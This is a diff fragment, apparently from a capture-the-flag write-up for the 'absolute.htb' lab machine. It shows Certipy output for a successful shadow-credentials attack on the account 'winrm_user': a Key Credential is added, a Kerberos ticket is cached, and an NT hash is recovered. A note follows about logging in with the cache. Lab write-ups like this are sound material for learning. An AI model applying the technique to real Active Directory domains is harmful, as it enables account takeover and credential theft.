@@ -248,9 +248,21 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 [*] Generating certificate
 [*] Certificate generated
 [*] Generating Key Credential
-[*] Key Credential generated with DeviceID '2ebad60814b54456b214a9ba8a36af88'
-[*] Adding Key Credential with device ID '2ebad60814b54456b214a9ba8a36af88' to the Key Credentials for 'winrm_user'
-[-] Could not update Key Credentials for 'winrm_user' due to insufficient access rights: 00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
+[*] Key Credential generated with DeviceID '8831f0b9a14d4e339bd1bcd6773742ae'
+[*] Adding Key Credential with device ID '8831f0b9a14d4e339bd1bcd6773742ae' to the Key Credentials for 'winrm_user'
+[*] Successfully added Key Credential with device ID '8831f0b9a14d4e339bd1bcd6773742ae' to the Key Credentials for 'winrm_user'
+[*] Authenticating as 'winrm_user' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'winrm_user@absolute.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'winrm_user.ccache'
+[*] Wrote credential cache to 'winrm_user.ccache'
+[*] Trying to retrieve NT hash for 'winrm_user'
+[*] Restoring the old Key Credentials for 'winrm_user'
+[*] Successfully restored the old Key Credentials for 'winrm_user'
+[*] NT hash for 'winrm_user': 8738c7413a5da3bc1d083efc0ab06cb2
 ```
 login with the cache
 ```console
